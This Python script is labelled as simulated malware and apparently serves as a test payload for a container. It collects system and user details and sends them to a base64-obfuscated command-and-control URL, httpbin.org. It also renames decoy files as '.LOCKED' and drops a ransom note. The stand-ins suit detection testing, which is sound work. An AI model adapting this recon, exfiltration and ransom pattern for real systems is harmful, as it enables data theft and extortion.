import os
import sys
import time
import socket
import base64
import platform
import urllib.request
import urllib.parse
import json

# --- CONFIGURACIÓN MALICIOSA SIMULADA ---
C2_ENCODED = "aHR0cDovL2h0dHBiaW4ub3JnL3Bvc3Q=" 

def get_c2_url():
    return base64.b64decode(C2_ENCODED).decode('utf-8')

def system_recon():
    """2. RECONOCIMIENTO: Roba información del sistema (VERSIÓN BLINDADA)"""
    print("[MALWARE] Iniciando recolección de inteligencia...")
    
    # Intentamos obtener el usuario de forma segura para Docker
    try:
        user_info = os.getlogin()
    except Exception:
        # Si falla (común en Docker/Cron), usamos variable de entorno o default
        user_info = os.getenv('USER', 'root_container')

    data = {
        "os": platform.system(),
        "release": platform.release(),
        "hostname": socket.gethostname(),
        "architecture": platform.machine(),
        "user": user_info 
    }
    return data

def ransomware_simulation():
    """3. COMPORTAMIENTO RANSOMWARE"""
    target_dir = "./mis_documentos_falsos"
    print(f"[MALWARE] Buscando archivos en {target_dir}...")
    
    if not os.path.exists(target_dir):
        os.makedirs(target_dir)
    
    files = ["passwords.txt", "bancario.pdf", "fotos_privadas.jpg"]
    for f in files:
        with open(os.path.join(target_dir, f), "w") as file:
            file.write("Datos confidenciales del usuario...")
    
    time.sleep(1) 
    
    print("[MALWARE] ¡Encriptando archivos del usuario!")
    for f in os.listdir(target_dir):
        file_path = os.path.join(target_dir, f)
        if os.path.isfile(file_path):
            new_name = file_path + ".LOCKED"
            os.rename(file_path, new_name)
            print(f"   -> Encriptado: {f} => {f}.LOCKED")
            
    with open("README_DECRYPT.txt", "w") as note:
        note.write("TUS ARCHIVOS HAN SIDO ENCRIPTADOS. ENVÍA 1 BTC A...")

def data_exfiltration(data):
    """4. EXFILTRACIÓN"""
    url = get_c2_url()
    print(f"[MALWARE] Intentando conectar al C2: {url}")
    
    try:
        json_data = json.dumps(data).encode('utf-8')
        req = urllib.request.Request(url, data=json_data, headers={'Content-Type': 'application/json'})
        
        # Timeout un poco más largo por si la red de Docker tarda en despertar
        with urllib.request.urlopen(req, timeout=10) as response:
            print(f"[MALWARE] ¡Exfiltración exitosa! Respuesta C2: {response.status}")
    except Exception as e:
        print(f"[MALWARE] Fallo en conexión C2: {e}")

# --- RUTINA PRINCIPAL ---
if __name__ == "__main__":
    print("=== INICIANDO PAYLOAD AVANZADO ===")
    
    try:
        # Paso 1: Reconocimiento
        stolen_data = system_recon()
        
        # Paso 2: Ransomware
        ransomware_simulation()
        
        # Paso 3: Exfiltración de red
        data_exfiltration(stolen_data)
        
    except Exception as e:
        print(f"[CRITICAL FAILURE] El malware falló internamente: {e}")
    
    print("=== EJECUCIÓN MALICIOSA FINALIZADA ===")